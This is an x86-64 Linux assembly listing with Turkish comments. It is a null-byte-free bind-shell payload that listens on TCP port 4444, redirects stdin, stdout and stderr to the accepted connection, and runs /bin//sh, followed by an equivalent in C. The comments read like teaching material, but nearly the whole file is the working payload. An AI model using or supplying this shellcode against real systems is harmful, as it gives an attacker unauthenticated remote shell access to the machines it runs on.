section .text
global _start

_start:

;=========================================================
; socket(AF_INET, SOCK_STREAM, 0)
;=========================================================

xor rax, rax          ; rax = 0
mov al, 41            ; sys_socket syscall numarası

xor rdi, rdi
mov dil, 2            ; rdi = AF_INET (IPv4)

xor rsi, rsi
mov sil, 1            ; rsi = SOCK_STREAM (TCP)

xor rdx, rdx          ; rdx = protocol (0 = varsayılan TCP)

syscall               ; socket(AF_INET, SOCK_STREAM, 0)

;---------------------------------------------------------
; Dönüş:
; rax = socket file descriptor
; Örneğin 3
;---------------------------------------------------------

mov dil, al           ; socket fd'yi rdi'ye koy (bind'in ilk parametresi)

;=========================================================
; struct sockaddr_in oluştur
;=========================================================

xor rax, rax          ; rax = 0

push ax               ; Stack'e 2 byte sıfır koy
                      ; Yapının son kısmını oluşturmaya başlıyoruz

mov dword [rsp-4], eax
                      ; sin_addr = 0
                      ; 0.0.0.0 (INADDR_ANY)

mov word [rsp-6], 0x5c11
                      ; Port = 4444
                      ;
                      ; Bellekte:
                      ; 11 5c
                      ;
                      ; Ağ düzeninde:
                      ; 5c11 = 4444

xor eax, eax
inc al
inc al                ; eax = 2

mov [rsp-8], ax
                      ; sin_family = AF_INET (2)

sub rsp, 8
                      ; Stack pointer'ı yapının başına getir
                      ;
                      ; Artık rsp ->
                      ;
                      ; +0 sin_family
                      ; +2 sin_port
                      ; +4 sin_addr
                      ; +8 sin_zero

;=========================================================
; bind(sock, &server, 16)
;=========================================================

xor rax, rax
mov al, 49            ; sys_bind

mov rsi, rsp          ; rsi = sockaddr_in adresi

mov dl, 16            ; sizeof(sockaddr_in)

syscall               ; bind(sock,&server,16)

;=========================================================
; listen(sock,2)
;=========================================================

xor rax, rax
mov al, 50            ; sys_listen

mov sil, 2            ; backlog = 2

syscall               ; listen(sock,2)

;=========================================================
; accept(sock,&client,&addrlen)
;=========================================================

xor rax, rax
mov al, 43            ; sys_accept

sub rsp,16
                      ; client sockaddr için yer ayır

mov rsi,rsp
                      ; rsi = client sockaddr

mov byte [rsp-1],16
                      ; addrlen = 16

sub rsp,1
                      ; addrlen değişkeni için yer ayır

mov rdx,rsp
                      ; rdx = &addrlen

syscall               ; accept()

;---------------------------------------------------------
; Dönüş:
; rax = client socket descriptor
;---------------------------------------------------------

mov r9,rax
                      ; client socket'i r9'da sakla

;=========================================================
; close(listening_socket)
;=========================================================

xor rax,rax
mov al,3              ; sys_close

syscall               ; close(sock)

;=========================================================
; dup2(client,0)
;=========================================================

mov rdi,r9            ; client socket

xor rax,rax
mov al,33             ; sys_dup2

xor rsi,rsi           ; stdin (0)

syscall

;=========================================================
; dup2(client,1)
;=========================================================

xor rax,rax
mov al,33

xor rsi,rsi
mov sil,1             ; stdout

syscall

;=========================================================
; dup2(client,2)
;=========================================================

xor rax,rax
mov al,33

xor rsi,rsi
mov sil,2             ; stderr

syscall

;---------------------------------------------------------
; Bundan sonra
;
; stdin  ---> socket
; stdout ---> socket
; stderr ---> socket
;
; Shell artık ağ üzerinden haberleşecek.
;---------------------------------------------------------

;=========================================================
; execve("/bin//sh",argv,NULL)
;=========================================================

xor rax,rax

push rax
                      ; "/bin//sh" stringinin sonundaki NULL

mov rbx,0x68732f2f6e69622f
                      ; "/bin//sh"

push rbx

mov rdi,rsp
                      ; rdi = "/bin//sh"

push rax
                      ; argv[1] = NULL

mov rdx,rsp
                      ; envp = NULL

push rdi
                      ; argv[0] = "/bin//sh"

mov rsi,rsp
                      ; argv dizisi

xor rax,rax
mov al,59             ; sys_execve

syscall

;=========================================================
; Çalıştırılan C kodunun karşılığı
;=========================================================

; int sock = socket(AF_INET, SOCK_STREAM, 0);
;
; bind(sock, &server, sizeof(server));
;
; listen(sock, 2);
;
; int client = accept(sock, &client_addr, &len);
;
; close(sock);
;
; dup2(client, 0);
; dup2(client, 1);
; dup2(client, 2);
;
; execve("/bin//sh",
;        {"/bin//sh", NULL},
;        NULL);
